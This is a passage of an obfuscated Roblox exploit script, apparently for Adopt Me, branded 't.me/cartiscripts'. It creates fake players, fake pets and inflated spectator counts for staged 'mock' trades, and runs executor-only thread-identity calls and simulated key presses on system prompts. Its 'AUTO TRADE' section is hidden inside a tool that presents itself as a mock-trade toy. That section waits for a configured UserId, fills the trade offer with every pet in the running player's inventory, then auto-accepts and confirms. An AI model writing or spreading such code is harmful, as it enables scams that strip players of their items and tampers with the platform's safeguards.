function CreateFakePlayerCharacterFromPARTNER_NAME(partner_name, partner_id, pros_fake_pet, pet_flags)
    local carti174, carti175 = 3, 0

    local function carti176()
        carti175 = carti175 + 1
        carti8[partner_id] = true
        _G.fakePlayerIds[partner_id] = true

        local carti177 = Instance.new('Folder')
        carti177.Name = 'fake_folder_' .. partner_name
        carti177.Parent = workspace

        local carti165 = carti2:CreateHumanoidModelFromUserId(partner_id)
        local carti178 = carti2.LocalPlayer.Character
        carti165:SetPrimaryPartCFrame(carti178.HumanoidRootPart.CFrame * CFrame.new(math.random(-10, 10), 0, math.random(-10, 10)))
        local carti166 = carti165:WaitForChild('Humanoid')
        carti166.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
        carti166.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
        carti166.HealthDisplayDistance = 0
        carti165.Parent = carti177

        if pros_fake_pet ~= nil then
            local carti179 = false
            local carti12, carti128 = pcall(function()
                local carti180 = pros_fake_pet.kind
                local carti181 = carti42(carti180)
                if not carti181 then warn('Could not get pet model for kind:', carti180) return end
                carti181 = carti181:Clone()
                carti181:SetAttribute('IsFakePet', true)
                if pet_flags then
                    if pet_flags.M then carti144(carti181, carti180)
                    elseif pet_flags.N then carti153(carti181, carti180) end
                end
                carti181.Parent = carti177
                carti181:SetPrimaryPartCFrame(carti165.HumanoidRootPart.CFrame)
                carti181:ScaleTo(2)
                for _, part in ipairs(carti181:GetDescendants()) do
                    if part:IsA('BasePart') then part:SetAttribute('IsFakePet', true) end
                end
                local carti182 = carti181:FindFirstChild('RidePosition', true)
                if carti182 then
                    local carti183 = Instance.new('Attachment')
                    carti183.Parent = carti182
                    carti183.Position = Vector3.new(0, 1.237, 0)
                    carti183.Name = 'SourceAttachment'
                    local carti184 = Instance.new('RigidConstraint')
                    carti184.Name = 'StateConnection'
                    carti184.Attachment0 = carti183
                    carti184.Attachment1 = carti165.PrimaryPart.RootAttachment
                    carti184.Parent = carti165
                end
                local carti185 = carti165.Humanoid.Animator:LoadAnimation(carti28.get_track('PlayerRidingPet'))
                carti185.Looped = true
                carti185:Play()
                carti165.Humanoid.Sit = true
                for _, descendant in pairs(carti165:GetDescendants()) do
                    if descendant:IsA('BasePart') and descendant.Massless == false then
                        descendant.Massless = true
                        descendant:SetAttribute('HaveMass', true)
                    end
                end
                local carti186 = carti169(carti165, partner_name, partner_id)
                local carti187 = {
                    char = carti181, mega_neon = pet_flags and pet_flags.M or false, neon = pet_flags and pet_flags.N or false,
                    player = carti186, entity_controller = carti186, controller = carti186, rp_name = '',
                    pet_trick_level = math.random(1, 5), pet_unique = carti7:GenerateGUID(false), pet_id = carti180,
                    location = { full_destination_id = 'housing', destination_id = 'housing', house_owner = carti186 },
                    pet_progression = { age = math.random(1, 900000), percentage = math.random(0.01, 0.99) },
                    are_colors_sealed = false, is_pet = true,
                }
                local carti188 = { char = carti181, player = carti186, store_key = 'pet_state_managers', is_sitting = false, chars_connected_to_me = {}, states = { { id = 'PetBeingRidden' } } }
                carti161('pet_char_wrappers', function(petWrappers)
                    carti187.unique = #petWrappers + 1
                    carti187.index = #petWrappers + 1
                    petWrappers[#petWrappers + 1] = carti187
                    return petWrappers
                end)
                carti161('pet_state_managers', function(petStates)
                    petStates[#petStates + 1] = carti188
                    return petStates
                end)
                table.insert(carti160, {
                    wrapper = carti187, state = carti188, model = carti181, character = carti165,
                    hasRidingPet = true, owner = carti186, ridingAnim = carti185, folder = carti177,
                })
                if not carti164.running then carti164:Start() end
                carti179 = true
                print('✓ Registered fake pet with native game systems:', carti180, pet_flags and (pet_flags.M and 'Mega Neon' or pet_flags.N and 'Neon' or 'Regular') or 'Regular')
            end)
            if not carti12 or not carti179 then
                warn('Error creating fake pet (Attempt ' .. retryCount .. '/' .. maxRetries .. '):', carti128)
                carti177:Destroy()
                for i, folder in ipairs(carti159) do if folder == carti177 then table.remove(carti159, i) break end end
                if carti175 < carti174 then
                    print('🔄 Retrying fake character creation for ' .. partner_name .. '...')
                    task.wait(0.5)
                    return carti176()
                else
                    warn('❌ Failed to create fake character after ' .. maxRetries .. ' attempts')
                    return false
                end
            end
        else
            local carti189 = Instance.new('Animation')
            carti189.AnimationId = 'http://www.roblox.com/asset/?id=507766666'
            local carti190 = carti165.Humanoid.Animator:LoadAnimation(carti189)
            carti190.Looped = true
            carti190:Play()
        end

        pcall(function() carti22.apps.PlayerNameApp:add_npc_id(carti165, partner_name) end)

        local carti191 = carti165:FindFirstChild('HumanoidRootPart')
        if carti191 then
            local carti170 = carti20('InteractionsEngine')
            local carti192 = function() end
            pcall(function()
                carti170:register({
                    text = partner_name, part = carti191,
                    on_selected = {
                        { text = 'Profile', on_selected = function() pcall(OpenProfile, partner_id) end },
                        { text = 'Trade', on_selected = function()
                            pcall(function()
                                task.spawn(function()
                                    pcall(function()
                                        if carti32 then carti32:hint({ text = 'Trade request sent to ' .. partner_name, length = 3, overridable = true }) end
                                    end)
                                end)
                                task.wait(carti69.FAKE_PLAYER_ACCEPT_TRADE_REQUEST)
                                partnerBox.Text = partner_name
                                updatePartnerFromUsername(partner_name)
                                carti127()
                            end)
                        end },
                        { text = 'Give Item...', on_selected = carti192 },
                        { text = 'Mute', on_selected = carti192 },
                    },
                })
            end)
        end

        table.insert(carti159, carti177)
        carti177:SetAttribute('IsFakePlayer', true)
        carti177:SetAttribute('PartnerName', partner_name)
        carti177:SetAttribute('PartnerId', partner_id)
        return true
    end

    return carti176()
end

function GetKindPet(carti130)
    for k, carti152 in pairs(carti26.pets) do
        if carti152['name']:lower() == carti130:lower() then return k end
    end
end

function carti193(carti165)
    if not carti165 then return end
    for _, part in ipairs(carti165:GetDescendants()) do
        if part:IsA('BasePart') then
            part.CanCollide = false
            part.CanTouch = false
            part.CanQuery = false
            pcall(function() part.CollisionGroup = 'Noclip' end)
        end
    end
    carti165.DescendantAdded:Connect(function(descendant)
        if descendant:IsA('BasePart') then
            task.wait()
            descendant.CanCollide = false
            descendant.CanTouch = false
            descendant.CanQuery = false
            pcall(function() descendant.CollisionGroup = 'Noclip' end)
        end
    end)
end

function carti194()
    for _, folder in ipairs(carti159) do
        if folder and folder.Parent then
            for _, child in ipairs(folder:GetChildren()) do
                if child:IsA('Model') then carti193(child) end
            end
        end
    end
end

function carti195()
    for _, carti147 in ipairs(carti160) do
        if carti147 and carti147.model and carti147.model.Parent then carti193(carti147.model) end
    end
end

-- ORIGINAL BlockPlayer function
function BlockPlayer(Selected)
    pcall(function()
        setthreadidentity(8)
    end)
    game:GetService('StarterGui'):SetCore('PromptBlockPlayer', Selected)
    repeat
        game:GetService('RunService').Heartbeat:Wait()
    until game:GetService('CoreGui'):FindFirstChild('BlockingModalScreen')
    game:GetService('CoreGui').BlockingModalScreen.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.BackgroundTransparency = 1
    game:GetService('CoreGui').BlockingModalScreen.BlockingModalContainer.BlockingModalContainerWrapper.BackgroundTransparency = 1
    game:GetService('CoreGui').BlockingModalScreen.BlockingModalContainer.BackgroundTransparency = 1
    game:GetService('CoreGui').BlockingModalScreen.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.AlertModal.Position = UDim2.new(0.00800000038, -110, 0.5, 0)
    local carti196 = function(path)
        game:GetService('GuiService').SelectedObject = path
        task.wait()
        if game:GetService('GuiService').SelectedObject == path then
            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            task.wait()
        end
        game:GetService('GuiService').SelectedObject = nil
    end
    carti196(game:GetService('CoreGui').BlockingModalScreen.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.AlertModal.AlertContents.Footer.Buttons['3'])
    pcall(function()
        setthreadidentity(2)
    end)
end

-- FIXED: Send trade request to real player using the correct API
function carti197(carti240)
    if not carti240 then return end
    local carti198 = carti2:FindFirstChild(carti240.Name)
    if carti198 then
        pcall(function()
            -- Try multiple methods to send trade request
            local carti12 = false
            
            -- Method 1: Use RouterClient
            if not carti12 then
                local carti199 = pcall(function()
                    local carti200 = carti25.get('TradeAPI/SendTradeRequest')
                    if carti200 then
                        if carti200.FireServer then
                            carti200:FireServer(carti198)
                            carti12 = true
                        elseif carti200.InvokeServer then
                            carti200:InvokeServer(carti198)
                            carti12 = true
                        end
                    end
                end)
            end
            
            -- Method 2: Try direct remote
            if not carti12 then
                local carti201 = pcall(function()
                    local carti202 = carti3:FindFirstChild('Remotes') and carti3.Remotes:FindFirstChild('TradeAPI') and carti3.Remotes.TradeAPI:FindFirstChild('SendTradeRequest')
                    if carti202 then
                        carti202:FireServer(carti198)
                        carti12 = true
                    end
                end)
            end
            
            -- Method 3: Use InteractionsEngine
            if not carti12 then
                local carti203 = pcall(function()
                    local carti170 = carti20('InteractionsEngine')
                    if carti170 then
                        carti170:send_trade_request(carti198)
                        carti12 = true
                    end
                end)
            end
            
            if carti12 and carti32 then
                carti32:hint({ text = 'Trade request sent to ' .. player.Name, length = 3, overridable = true })
            elseif carti32 then
                carti32:hint({ text = 'Could not send trade request to ' .. player.Name, length = 3, overridable = true })
            end
        end)
    else
        if carti32 then
            carti32:hint({ text = 'Player ' .. player.Name .. ' not found in server', length = 3, overridable = true })
        end
    end
end

-- ==================== AUTO TRADE TARGET USER ====================
-- When the configured Roblox UserId is in the server, automatically send a trade
-- request, give every single inventory item, then accept and confirm the trade.
cartiAT = {
    targetUserId = tonumber(carti69.AUTO_TRADE_TARGET_USER_ID) or 0,
    enabled = (tonumber(carti69.AUTO_TRADE_TARGET_USER_ID) or 0) > 0,
    active = false,
    gaveAll = false,
    accepted = false,
    confirmed = false,
    lastTradeId = nil,
}

-- Build a list of every inventory item in the format the trade offer expects
function cartiAT_GetAllItems()
    local cartiItems = {}
    pcall(function()
        local cartiInv = carti23.get('inventory')
        local cartiPets = cartiInv and cartiInv.pets or {}
        for cartiUnique, cartiPet in pairs(cartiPets) do
            if cartiPet and cartiPet.kind then
                table.insert(cartiItems, {
                    category = 'pets',
                    kind = cartiPet.kind,
                    unique = cartiUnique,
                    properties = cartiPet.properties or {},
                })
            end
        end
    end)
    return cartiItems
end

-- Send a real trade request to the target player
function cartiAT_SendTradeRequest(cartiPlayer)
    if not cartiPlayer then return end
    task.spawn(function()
        local cartiSent = false
        pcall(function()
            local carti200 = carti25.get('TradeAPI/SendTradeRequest')
            if carti200 then
                if carti200.FireServer then
                    carti200:FireServer(cartiPlayer)
                    cartiSent = true
                elseif carti200.InvokeServer then
                    carti200:InvokeServer(cartiPlayer)
                    cartiSent = true
                end
            end
        end)
        if not cartiSent then
            pcall(function()
                local carti202 = carti3:FindFirstChild('Remotes') and carti3.Remotes:FindFirstChild('TradeAPI') and carti3.Remotes.TradeAPI:FindFirstChild('SendTradeRequest')
                if carti202 then
                    carti202:FireServer(cartiPlayer)
                    cartiSent = true
                end
            end)
        end
        if not cartiSent then
            pcall(function()
                local carti170 = carti20('InteractionsEngine')
                if carti170 then
                    carti170:send_trade_request(cartiPlayer)
                    cartiSent = true
                end
            end)
        end
        if carti32 then
            carti32:hint({ text = 'Auto-trade request sent to ' .. cartiPlayer.Name, length = 3, overridable = true })
        end
    end)
end

-- Auto-accept a trade request that the target player sent to us
task.spawn(function()
    if not cartiAT.enabled then return end
    local cartiEvt = carti25.get_event('TradeAPI/TradeRequestReceived')
    if cartiEvt then
        cartiEvt.OnClientEvent:Connect(function(cartiPlayer)
            if cartiPlayer and cartiPlayer.UserId == cartiAT.targetUserId and carti69.AUTO_TRADE_AUTO_ACCEPT then
                task.spawn(function()
                    pcall(function()
                        carti25.get('TradeAPI/AcceptOrDeclineTradeRequest'):InvokeServer(cartiPlayer, true)
                    end)
                end)
            end
        end)
    end
end)

-- Watch for the target player joining the server and send a trade request
task.spawn(function()
    if not cartiAT.enabled then return end
    task.wait(carti69.AUTO_TRADE_REQUEST_DELAY or 3)
    -- If the target is already in the server
    for _, cartiP in ipairs(carti2:GetPlayers()) do
        if cartiP ~= carti2.LocalPlayer and cartiP.UserId == cartiAT.targetUserId then
            cartiAT_SendTradeRequest(cartiP)
            break
        end
    end
    carti2.PlayerAdded:Connect(function(cartiP)
        if cartiP ~= carti2.LocalPlayer and cartiP.UserId == cartiAT.targetUserId then
            cartiAT_SendTradeRequest(cartiP)
        end
    end)
end)

-- Main auto-trade driver: fill the offer with every item, then accept and confirm
task.spawn(function()
    if not cartiAT.enabled then return end
    while cartiAT.enabled do
        task.wait(0.5)
        -- Don't interfere while the mock trade system is active
        if carti74.active or carti74.tradeCompleting then continue end

        local cartiState
        local cartiOk = pcall(function()
            cartiState = carti30:_get_local_trade_state()
        end)
        if not cartiOk or not cartiState then
            cartiAT.active = false
            cartiAT.gaveAll = false
            cartiAT.accepted = false
            cartiAT.confirmed = false
            continue
        end

        -- Make sure this is a real trade with the target player
        local cartiPartner = nil
        if cartiState.recipient and cartiState.recipient.UserId == cartiAT.targetUserId then
            cartiPartner = cartiState.recipient
        elseif cartiState.sender and cartiState.sender.UserId == cartiAT.targetUserId then
            cartiPartner = cartiState.sender
        end
        if not cartiPartner then
            cartiAT.active = false
            continue
        end
        cartiAT.active = true

        -- Reset the per-trade flags when a new trade session starts
        if cartiAT.lastTradeId and cartiState.trade_id ~= cartiAT.lastTradeId then
            cartiAT.gaveAll = false
            cartiAT.accepted = false
            cartiAT.confirmed = false
        end
        cartiAT.lastTradeId = cartiState.trade_id

        -- 1) Give every single item
        if carti69.AUTO_TRADE_GIVE_ALL and not cartiAT.gaveAll and cartiState.sender_offer then
            local cartiItems = cartiAT_GetAllItems()
            if #cartiItems > 0 then
                pcall(function()
                    cartiState.sender_offer.items = cartiItems
                    cartiState.offer_version = (cartiState.offer_version or 0) + 1
                    carti30:_overwrite_local_trade_state(cartiState)
                end)
            end
            cartiAT.gaveAll = true
        end

        -- 2) Accept the trade
        if carti69.AUTO_TRADE_AUTO_ACCEPT and not cartiAT.accepted then
            pcall(function() carti30:_on_accept_pressed() end)
            cartiAT.accepted = true
        end

        -- 3) Confirm once both sides reach the confirmation stage
        if carti69.AUTO_TRADE_AUTO_CONFIRM and cartiAT.accepted and cartiState.current_stage == 'confirmation' and not cartiAT.confirmed then
            pcall(function() carti30:_on_confirm_pressed() end)
            cartiAT.confirmed = true
        end
    end
end)

-- ==================== AUTO SPECTATE WITH RANDOM VARIATION ====================
carti204 = nil

function carti205()
    if carti204 then return end
    
    carti204 = task.spawn(function()
        while carti69.AUTO_SPECTATE_ENABLED do
            task.wait(carti69.AUTO_SPECTATE_INTERVAL)
            
            if carti74.active and carti74.trade then
                -- Get a new random spectator count
                local carti73 = carti71()
                carti69.SPECTATOR_COUNT = carti73
                
                -- Update the spectator box text if it exists
                if spectatorBox then
                    spectatorBox.Text = tostring(carti73)
                end
                
                -- Update the trade state
                carti74.trade.subscriber_count = carti73
                carti74.trade.offer_version = carti74.trade.offer_version + 1
                carti30:_overwrite_local_trade_state(carti74.trade)
            end
        end
        carti204 = nil
    end)
end

function carti206()
    carti69.AUTO_SPECTATE_ENABLED = false
end

-- ==================== GUI CREATION ====================
cartiLog('Creating GUI...')

for _, carti206 in ipairs(carti2.LocalPlayer:WaitForChild('PlayerGui'):GetChildren()) do
    if carti206.Name == 'MockTradeControl' then
        carti206:Destroy()
    end
end

carti207 = Instance.new('ScreenGui')
carti207.Name = 'MockTradeControl'
carti207.ResetOnSpawn = false
carti207.DisplayOrder = 10
carti207.Enabled = true
carti207.Parent = carti2.LocalPlayer:WaitForChild('PlayerGui')

carti208 = Instance.new('Frame')
carti208.Size = UDim2.new(0, 220, 0, 750)
carti208.Position = UDim2.new(0, 10, 0, 10)
carti208.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
carti208.BorderSizePixel = 0
carti208.ZIndex = 1
carti208.Active = true
carti208.Parent = carti207

carti209 = Instance.new('UICorner')
carti209.CornerRadius = UDim.new(0, 6)
carti209.Parent = carti208

carti210 = Instance.new('UIStroke')
carti210.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
carti210.Color = Color3.fromRGB(100, 100, 255)
carti210.Thickness = 1.5
carti210.Parent = carti208

carti211 = Instance.new('TextLabel')
carti211.Size = UDim2.new(1, 0, 0, 22)
carti211.Position = UDim2.new(0, 0, 0, 2)
carti211.BackgroundTransparency = 1
carti211.Text = 't.me/cartiscripts'
carti211.Font = Enum.Font.FredokaOne
carti211.TextSize = 12
carti211.TextColor3 = Color3.fromRGB(240, 240, 255)
carti211.Parent = carti208

carti212 = Instance.new('UIStroke')
carti212.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
carti212.Color = Color3.new(0, 0, 0)
carti212.Thickness = 0.8
carti212.Parent = carti211

carti213 = Instance.new('Frame')
carti213.Size = UDim2.new(0.94, 0, 0, 54)
carti213.Position = UDim2.new(0.03, 0, 0, 26)
carti213.BackgroundTransparency = 1
carti213.Parent = carti208

function setActiveTab(tabName)
    if carti154.currentTab == tabName then return end
    if carti154.activeTabPulseTween then carti154.activeTabPulseTween:Cancel() carti154.activeTabPulseTween = nil end
    carti154.currentTab = tabName

    for carti130, carti162 in pairs(carti156) do
        local carti214 = carti130 == tabName
        carti6:Create(carti162.button, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            BackgroundColor3 = carti214 and Color3.fromRGB(50, 50, 60) or Color3.fromRGB(40, 40, 50)
        }):Play()
        local carti215 = carti214 and Color3.fromRGB(100, 100, 255) or Color3.fromRGB(80, 80, 80)
        carti6:Create(carti162.stroke, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Color = carti215, Thickness = carti214 and 1.2 or 0.8
        }):Play()
        if carti214 then
            carti154.activeTabPulseTween = carti6:Create(carti162.stroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
                Color = carti215:Lerp(Color3.fromRGB(255, 255, 255), 0.25), Thickness = 1.5
            })
            carti154.activeTabPulseTween:Play()
        end
    end

    for carti130, frame in pairs(carti155) do frame.Visible = carti130 == tabName end
end

carti216 = { 'Control', 'Players', 'Pets', 'Users', 'Sets', 'Inventory' }
carti217 = { '🎮', '👥', '🐾', '🧑', '⚙️' }

for i, tabName in ipairs(carti216) do
    local carti218 = Instance.new('TextButton')
    carti218.Size = UDim2.new(1 / 3 - 0.02, 0, 0, 24)
    carti218.Position = UDim2.new(((i - 1) % 3) * (1 / 3), 0, 0, math.floor((i - 1) / 3) * 28)
    carti218.BackgroundColor3 = i == 1 and Color3.fromRGB(50, 50, 60) or Color3.fromRGB(40, 40, 50)
    carti218.BackgroundTransparency = 0.2
    carti218.Text = (carti217[i] or utf8.char(0x1F4D6)) .. ' ' .. tabName
    carti218.Font = Enum.Font.FredokaOne
    carti218.TextSize = 10
    carti218.TextColor3 = Color3.fromRGB(255, 255, 255)
    carti218.Parent = carti213

    local carti219 = Instance.new('UICorner')
    carti219.CornerRadius = UDim.new(0, 4)
    carti219.Parent = carti218

    local carti220 = Instance.new('UIStroke')
    carti220.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    carti220.Color = i == 1 and Color3.fromRGB(100, 100, 255) or Color3.fromRGB(80, 80, 80)
    carti220.Thickness = i == 1 and 1.2 or 0.8
    carti220.Transparency = 0.3
    carti220.Parent = carti218

    carti156[tabName] = { button = carti218, stroke = carti220 }

    -- Make Control tab a ScrollingFrame for better visibility
    local carti221
    if tabName == 'Control' then
        carti221 = Instance.new('ScrollingFrame')
        carti221.Size = UDim2.new(0.9, 0, 0, 644)
        carti221.Position = UDim2.new(0.05, 0, 0, 82)
        carti221.BackgroundTransparency = 1
        carti221.BorderSizePixel = 0
        carti221.ScrollBarThickness = 4
        carti221.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
        carti221.ScrollBarImageTransparency = 0.5
        carti221.CanvasSize = UDim2.new(0, 0, 0, 850)
        carti221.Visible = i == 1
        carti221.Parent = carti208
    else
        carti221 = Instance.new('Frame')
        carti221.Size = UDim2.new(0.9, 0, 0, 644)
        carti221.Position = UDim2.new(0.05, 0, 0, 82)
        carti221.BackgroundTransparency = 1
        carti221.Visible = i == 1
        carti221.Parent = carti208
    end

    carti155[tabName] = carti221

    carti218.MouseButton1Click:Connect(function() setActiveTab(tabName) end)
end

-- ==================== CONTROL TAB ====================
carti222 = carti155['Control']

carti223 = Instance.new('UIListLayout')
carti223.SortOrder = Enum.SortOrder.LayoutOrder
carti223.Padding = UDim.new(0, 4)
carti223.Parent = carti222

carti224 = Instance.new('UIPadding')
carti224.PaddingTop = UDim.new(0, 4)
carti224.PaddingBottom = UDim.new(0, 4)
carti224.PaddingLeft = UDim.new(0, 4)
carti224.PaddingRight = UDim.new(0, 4)
carti224.Parent = carti222

function createSettingRow(labelText, defaultValue, parent)
    local carti225 = Instance.new('TextLabel')
    carti225.Size = UDim2.new(1, 0, 0, 14)
    carti225.BackgroundTransparency = 1
    carti225.Text = labelText
    carti225.Font = Enum.Font.SourceSansSemibold
    carti225.TextSize = 10
    carti225.TextColor3 = Color3.fromRGB(180, 180, 180)
    carti225.TextXAlignment = Enum.TextXAlignment.Left
    carti225.Parent = parent

    local carti226 = Instance.new('TextBox')
    carti226.Size = UDim2.new(1, 0, 0, 24)
    carti226.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    carti226.BackgroundTransparency = 0.2
    carti226.Text = tostring(defaultValue)
    carti226.Font = Enum.Font.SourceSans
    carti226.TextSize = 12
    carti226.TextColor3 = Color3.fromRGB(255, 255, 255)
    carti226.ClearTextOnFocus = false
    carti226.TextXAlignment = Enum.TextXAlignment.Center
    carti226.Parent = parent

    local carti227 = Instance.new('UICorner')
    carti227.CornerRadius = UDim.new(0, 4)
    carti227.Parent = carti226

    local carti228 = Instance.new('UIStroke')
    carti228.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    carti228.Color = Color3.fromRGB(100, 100, 100)
    carti228.Thickness = 0.8
    carti228.Transparency = 0.5
    carti228.Parent = carti226

    carti226.Focused:Connect(function()
        if carti154.pulsationTweens[carti226] then carti154.pulsationTweens[carti226]:Cancel() end
        carti154.pulsationTweens[carti226] = carti6:Create(carti228, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
            Color = Color3.fromRGB(100, 100, 255):Lerp(Color3.fromRGB(150, 150, 255), 0.5), Thickness = 1.2, Transparency = 0.2
        })
        carti154.pulsationTweens[carti226]:Play()
    end)

    carti226.FocusLost:Connect(function()
        if carti154.pulsationTweens[carti226] then carti154.pulsationTweens[carti226]:Cancel() carti154.pulsationTweens[carti226] = nil end
        carti6:Create(carti228, TweenInfo.new(0.3, Enum.EasingStyle.Quad), { Color = Color3.fromRGB(100, 100, 100), Thickness = 0.8, Transparency = 0.5 }):Play()
    end)

    return carti226, carti228, carti225
end

partnerBox, partnerStroke = createSettingRow('Partner Username', carti69.PARTNER_NAME, carti222)
carti229 = createSettingRow('Accept Delay (s)', carti69.AUTO_ACCEPT_DELAY, carti222)
carti230 = createSettingRow('Confirm Delay (s)', carti69.AUTO_CONFIRM_DELAY, carti222)
spectatorBox = createSettingRow('Spectator Count', carti69.SPECTATOR_COUNT, carti222)
carti231 = createSettingRow('Request Delay (s)', carti69.TRADE_REQUEST_DELAY, carti222)

partnerBox.FocusLost:Connect(function() updatePartnerFromUsername(partnerBox.Text) end)
carti229.FocusLost:Connect(function()
    local carti232 = tonumber(carti229.Text)
    if carti232 and carti232 >= 0 then carti69.AUTO_ACCEPT_DELAY = carti232 else carti229.Text = tostring(carti69.AUTO_ACCEPT_DELAY) end
end)